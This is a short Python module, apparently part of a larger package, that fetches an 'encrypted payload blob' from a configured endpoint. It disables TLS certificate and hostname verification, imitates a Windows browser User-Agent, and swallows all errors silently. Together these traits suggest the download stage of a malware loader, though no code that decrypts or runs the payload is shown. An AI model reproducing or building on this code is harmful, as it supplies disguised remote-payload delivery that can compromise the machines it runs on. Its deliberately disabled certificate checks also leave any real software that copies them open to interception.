# -*- coding: utf-8 -*-
"""
HTTP client — retrieves the encrypted payload blob from the configured endpoint.
"""
import ssl
import urllib.request
import urllib.error

from .env import TIMEOUT

_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"


def fetch(endpoint: str) -> bytes | None:
    """GET the encrypted blob. Returns raw bytes, or None on failure."""
    if not endpoint or not endpoint.startswith(("http://", "https://")):
        return None

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(endpoint, headers={"User-Agent": _UA})
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT, context=ctx) as resp:
            if resp.status != 200:
                return None
            data = resp.read()
    except (urllib.error.URLError, TimeoutError, OSError):
        return None

    if not data or len(data) < 64:
        return None
    return data


# Legacy signatures kept so any other module importing them still resolves.
def connect(endpoint):
    return fetch(endpoint)


def _send(url, data=None, timeout=None):
    return fetch(url)
